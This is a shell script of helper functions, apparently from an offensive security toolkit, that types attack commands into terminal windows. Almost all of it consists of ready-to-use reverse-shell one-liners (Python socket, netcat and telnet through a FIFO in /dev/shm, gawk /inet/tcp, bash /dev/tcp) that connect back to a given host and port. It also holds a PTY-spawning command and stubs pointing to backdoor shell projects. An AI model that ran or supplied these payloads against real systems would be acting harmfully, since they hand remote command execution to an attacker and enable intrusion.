yeo__SpawnPty() {
    if [ "$#" -ne 1 ]; then
	echo "$0 [window_num]"
	return
    fi
    read -r -d '' spawn_pty <<EOF
python -c 'import pty; pty.spawn("/bin/sh")'
EOF
    yeoRunCommand $spawn_pty $1
}
yeo__PythonReverseShell() {
    if [ "$#" -ne 3 ]; then
	echo "$0 [lhost] [lport] [window_num]"
	return
    fi
    read -r -d '' cmd <<EOF 
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$1",$2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
EOF
yeoRunCommand "$cmd" $3
}

yeo__NetcatReverseShell() {
    if [ "$#" -ne 3 ]; then
	echo "$0 [lhost] [lport] [window_num]"
	return
    fi
    cmd="rm /dev/shm/.f;mkfifo /dev/shm/.f;cat /dev/shm/.f |/bin/sh -i 2>&1|nc $1 $2 >/dev/shm/.f"

    yeoRunCommand "$cmd" $3   
}
yeo__TelnetReverseShell() {
    if [ "$#" -ne 3 ]; then
	echo "$0 [lhost] [lport] [window_num]"
	return
    fi

    cmd="rm /dev/shm/.f;mkfifo /dev/shm/.f;cat /dev/shm/.f |/bin/sh -i 2>&1|telnet $1 $2 >/dev/shm/.f"
    yeoRunCommand "$cmd" $3   
}
yeo__GawkReverseShell() {
    if [ "$#" -ne 3 ]; then
	echo "$0 [lhost] [lport] [window_num]"
	return
    fi
    cmd="awk 'BEGIN{s=\"/inet/tcp/0/$1/$2\";for(;s|&getline c;close(c))while(c|getline)print|&s;close(s)}'"
    yeoRunCommand "$cmd" $3
}

yeo__BashReverseShell() {
    if [ "$#" -ne 3 ]; then
	echo "$0 [lhost] [lport] [window_num]"
	return
    fi
    cmd="bash -i >& /dev/tcp/$1/$2 0>&1"
    yeoRunCommand "$cmd" $3
}

yeo__Amcsh() {
    # https://github.com/t57root/amcsh
}

yeo__Tsh() {
    # https://github.com/creaktive/tsh
}
